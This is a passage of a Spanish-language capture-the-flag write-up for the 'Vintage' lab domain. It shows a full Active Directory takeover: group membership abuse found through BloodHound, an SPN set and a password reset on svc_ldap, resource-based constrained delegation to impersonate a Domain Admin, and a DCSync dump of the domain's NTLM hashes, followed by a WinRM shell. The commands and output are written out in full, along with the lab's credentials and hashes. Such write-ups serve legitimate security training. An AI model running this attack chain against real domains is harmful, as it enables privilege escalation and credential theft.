Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
~~~

Acabamos de obtener las credenciales para el usuario `c.neri_adm`. Ahora veamos en BloodHound lo que puede hacer este usuario


## Domain Analysis - Bloodhound

El usuario `C.Neri_adm` posee derechos `AddSelf` y `GenericWrite` sobre el grupo `Delegated Admins`, estos derechos le permiten agregarse a sí mismo al grupo y modificar atributos del mismo

![image-center](/assets/images/posts/vintage-bloodhound-5.png)

Dentro del grupo `Delegated Admins`, se encuentra el usuario `l.bianchi_adm` como miembro además de `C.Neri_adm`

![image-center](/assets/images/posts/vintage-bloodhound-6.png)

`L.Bianchi_adm` forma parte del grupo `Domain Admins`, lo que le da control total sobre el dominio. Entonces, este usuario puede ser nuestro objetivo potencial al ser un administrador.

![image-center](/assets/images/posts/vintage-bloodhound-7.png)


## Resource Based Constrained Delegation (RBCD)

Los miembros del grupo `Delegated Admins` pueden añadirse al atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Este atributo permite impersonar a un usuario abusando de `S4U2Self/S4UProxy`. Algunas de las condiciones para llevar a cabo este ataque son las siguientes:

- El usuario que utilicemos para impersonar a otro no debe ser parte del grupo `Protected Users`
- El usuario que usaremos para el ataque debe contar con un Service Principal Name (`SPN`), sino, lo asignaremos nosotros

![image-center](/assets/images/posts/vintage-bloodhound-8.png)

Esto podemos confirmarlo desde la sesión de `powershell` con el usuario `C.Neri`. El DC permite delegación de recursos

~~~ powershell
*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ADComputer DC01 -Properties PrincipalsAllowedToDelegateToAccountt


DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
DNSHostName                          : dc01.vintage.htb
Enabled                              : True
Name                                 : DC01
ObjectClass                          : computer
ObjectGUID                           : c90b840f-7704-46ee-a3fb-aff23c8183c7
PrincipalsAllowedToDelegateToAccount : {CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb}
SamAccountName                       : DC01$
SID                                  : S-1-5-21-4024337825-2033394866-2055507597-1002
UserPrincipalName 
~~~

Entonces nuestro objetivo será convertirnos en un usuario privilegiado a través de este vector. Como el usuario `L.Bianchi_adm` es parte del grupo `Delegated Admins` y además posee mayores privilegios, solicitaremos un TGS para convertirnos en este usuario y así poder conectarnos al DC. Para llevar a cabo el ataque seguiremos una serie de pasos:

- Agregar un SPN a un usuario que controlemos, podemos aprovechar la cuenta `svc_ldap` para llevar a cabo el ataque
- Utilizaremos `S4U2Self` para solicitar un TGS en nombre de la cuenta objetivo (`L.Bianchi_adm`)
- Usaremos `S4U2Proxy` para autenticarnos con el ticket que obtendremos

Primeramente usaremos un ticket como el usuario `C.Neri_adm` para contar con los privilegios suficientes

~~~ bash
getTGT.py vintage.htb/C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312 -dc-ip 10.10.11.45
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.Neri_adm.ccache

export KRB5CCNAME=C.Neri_adm.ccache
~~~

Procedemos añadiendo la cuenta `svc_ldap` al grupo `Delegated Admins` utilizando `net`, debemos especificar el uso de `kerberos` con el parámetro `--use-kerberos=required`

~~~
net rpc group addmem "DELEGATEDADMINS" "svc_ldap" --use-kerberos=required -S DC01.vintage.htb

net rpc group members "DELEGATEDADMINS" --use-kerberos=required -S DC01.vintage.htb 
VINTAGE\svc_ldap
VINTAGE\C.Neri_adm
VINTAGE\L.Bianchi_adm
~~~

Procederemos asignando un SPN (Service Principal Name) a la cuenta `svc_ldap`. Esto es clave ya que **nos permitirá identificar un servicio al que intentamos acceder**, sin este atributo, no podremos obtener un TGS (Ticket Granting Service)

~~~ bash
export KRB5CCNAME=C.Neri.ccache 

bloodyAD --host DC01.vintage.htb -d vintage.htb -k set object 'SVC_LDAP' servicePrincipalName -v 'cifs/incommatose'
[+] SVC_LDAP\'s servicePrincipalName has been updated
~~~

Cambiaremos la contraseña de la cuenta `svc_ldap` usando `kerberos` sobre el comando `net`

~~~ bash
net rpc password svc_ldap "newP@assword2022" -S dc01.vintage.htb --use-kerberos=required
~~~

Ahora solicitaremos un TGT para la cuenta `svc_ldap`, lo necesitaremos para impersonar al usuario `L.Bianchi_adm` mediante `kerberos`

~~~ bash
getTGT.py vintage.htb/svc_ldap:'newP@assword2022' -dc-ip 10.10.11.45
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
~~~

### S4U2Self/S4U2Proxy

Ahora obtendremos un Ticket Granting Service que nos permita autenticarnos como el usuario `L.Bianchi_adm`

~~~ bash
export KRB5CCNAME=svc_ldap.ccache

impacket-getST -k -no-pass -spn 'HTTP/DC01.vintage.htb' -impersonate 'L.Bianchi_adm' -dc-ip 10.10.11.45 'vintage.htb/svc_ldap'@DC01.vintage.htb 
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating L.Bianchi_adm
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm.ccache
~~~

> WinRM usa HTTP como su protocolo de transporte base porque es un protocolo basado en SOAP, (protocolo de acceso de objetos simples), su funcionalidad central se basa en el protocolo HTTP para la comunicación
{: .notice--danger}


## (Extra) DCSync

Además podemos extraer el NTDS de todos los usuarios del dominio para conectarnos como `Administrator` si nos da la gana (aunque está restringido). En otras palabras, solicitaremos recursos privilegiados al Domain Controller haciéndonos pasar por un DC

~~~ bash
export KRB5CCNAME=L.Bianchi_adm.ccache

secretsdump.py vintage.htb/l.bianchi_adm@DC01.vintage.htb -k -no-pass -just-dc-ntlm
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:48d244770248359551f188243ca7dac5:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Cleaning up...
~~~


## Shell as `L.Bianchi_adm` - Root Time

Primeramnete cargamos el archivo `.ccache` en la variable `KRB5CCNAME`

~~~ bash
export KRB5CCNAME=L.Bianchi_adm.ccache
~~~

Ahora que tenemos un ticket cargado como el usuario `L.Bianchi_adm`, podremos conectarnos al dominio utilizando `evil-winrm` de la misma forma en la que nos conectamos con el usuario `C.Neri`

~~~ bash
evil-winrm -i DC01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> whoami
vintage\l.bianchi_adm
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> type ..\..\Administrator\Desktop\root.txt
d00...
~~~

Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Time is not a measure the length of a day or month or year but more a measure of what you have accomplished.
> — Byron Pulsifer
{: .notice--info}
